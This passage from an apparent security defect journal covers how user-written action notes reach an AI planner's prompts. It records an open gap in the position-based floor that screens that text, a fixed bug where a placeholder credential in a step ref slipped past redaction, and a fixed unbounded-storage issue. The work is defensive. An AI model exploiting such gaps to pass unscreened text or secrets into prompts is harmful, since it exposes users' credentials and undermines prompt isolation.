  `api/tests/security/action-feedback-isolation.test.ts` ("THE FLOOR IS VALUE-ANCHORED"), so a future
  widening of the floor turns that case red rather than passing unnoticed. Mitigations, such as they
  are: the note never leaves its author's own prompts (org AND user scoped on every read), and the
  editor says in both locales that the assistant reads what is typed. CLOSING IT means a
  content-shaped detector rather than a position-shaped one, which is a change to the shared floor
  and to every surface that uses it - not a change to this slice.

- **`s3-a-note-outlives-the-action-it-was-written-about`** (OPEN, MINOR, 2026-08-22, slice S3; same
  journal entry). A row is addressed by an action NAME, and the package naming that action is a
  separate document with its own lifecycle - so a note survives the action being re-authored out of
  the package, the caller's resolution narrowing under them, or the integration being disconnected.
  Two consequences, deliberately different:
  - on the DASHBOARD the note still renders under its action name WITH its erasure control, which is
    the direction chosen on purpose - hiding it would strand the only copy of something a person
    wrote with no way to reach the delete. **CORRECTED 2026-08-22 (review round): when this entry
    was first written that control DID NOT EXIST, and this dismissal rested on it.** The component
    resolved notes by slot only, so a note whose step had left the plan rendered nowhere, and the
    page renders one card per capability action, so a note about a departed action had no card at
    all - both invisible and unerasable while both kept reaching the author's prompts. The control
    is built now (`orphanedSteps` and `DepartedActionNotes`), the departed-action case is
    ERASE-ONLY because the write refuses an action off the definition, and all of it is pinned by
    component tests plus a third e2e leg. The dismissal below stands only because the control it
    names is now real;
  - in a PROMPT (`feedbackSectionsForOwner`, the planner and fixer read) it is stale guidance about
    an action the caller may no longer reach. That read deliberately does not re-resolve every row's
    definition: it runs on the hot path of every automation plan, one resolution per row is one
    round trip per note, and the row is the caller's OWN text going back into the caller's OWN
    prompt, so this is staleness and not a disclosure.
  There is no collector, and that is S1's removal rule inherited rather than an omission: nothing
  synchronous decides a durable row is over. Unlike an evidence row this one holds no third-party
  data and pins no screenshots, so the residual is a person's own capped sentence, closable by them
  at any moment. CLOSING IT would mean either a reachability check (the design that cost the evidence
  collection four rounds and five defects) or a retention sweep over text nobody asked to expire.

- **`s3-an-anchored-credential-written-as-a-step-ref-escaped-the-prompt-floor`**
  (**FIXED 2026-08-22**, S3 review round, was MINOR; journal entry `S3: a person's own notes about an
  action`). `feedbackPromptSection` scrubbed `row.note` and then interpolated `row.stepRef` RAW into
  the same prompt line. `stepRef` is caller-supplied free text that is deliberately never validated
  against a plan, so a credential written in the shape the floor exists to catch
  (`api_key: sk_live_…`, comfortably inside the ref's own ceiling) reached the `load_context`,
  planner/rehearsal and `achieve` prompts unredacted, while the identical bytes in the note body
  were redacted. The module header's claim that the floor is applied "to every row" was narrower
  than it read: it covered one field of the row. Invisible to the M5 mutation proof, because every
  scrub fixture planted its secret in the note body. FIXED by scrubbing the WHOLE COMPOSED LINE,
  which costs no over-redaction (`SECRET_LINE_RE` anchors on a credential-named key and then scans
  tokens, so only a token that `looksLikePastedSecret` is touched), plus a store-side ceiling on
  `stepRef` so the bound is not only the wire schema's. Pinned in both directions: a secret in a
  step ref is redacted, and an ordinary slug survives untouched.

- **`s3-one-person-could-mint-unbounded-notes-for-a-single-action`** (**FIXED 2026-08-22**, S3 review
  round, was MINOR; same journal entry). Every distinct `stepRef` hashes to a distinct deterministic
  `_id` and `stepRef` is unvalidated by design, so one authenticated user could create unbounded
  ~2 KB rows for a single (integration, action) - collected by nothing (there is no retention sweep
  here, deliberately), materialised on the detail-page read and on two prompt hot paths. The
  character budget bounded what reached the MODEL, never what was fetched or stored: a bounded
  answer over an unbounded read, which is the exact distinction this slice's own `Store.find` limit
  docblock draws and which had been applied to `listForOwner` alone. FIXED with
  `ACTION_FEEDBACK_MAX_NOTES_PER_ACTION` (50) at the write - checked only when the write would
  CREATE a row, so an edit at the ceiling still lands - and `listNewestForIntegration`, a query-side
  sorted-and-limited read for the two prompt seams, leaving the author's page read unbounded because
  completeness is its contract. Not a tenancy defect at any point: rows were always the caller's own.
